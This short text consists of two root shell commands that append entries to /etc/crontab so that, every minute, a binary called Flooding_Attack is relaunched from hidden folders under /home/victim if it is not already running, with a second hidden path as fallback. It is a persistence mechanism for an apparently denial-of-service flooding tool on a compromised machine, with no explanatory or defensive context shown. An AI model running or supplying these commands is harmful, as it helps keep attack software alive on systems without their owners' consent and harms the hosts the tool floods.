sudo bash -c 'echo "*/1 * * * * root pgrep Flooding_Attack || /home/victim/.david/.module/Flooding_Attack" >> /etc/crontab'

sudo bash -c 'echo "*/1 * * * * root  pgrep Flooding_Attack || ( [ ! -f "/home/victim/.david/.module/Flooding_Attack" ] && /home/victim/.steven/.module/Flooding_Attack)" >> /etc/crontab'
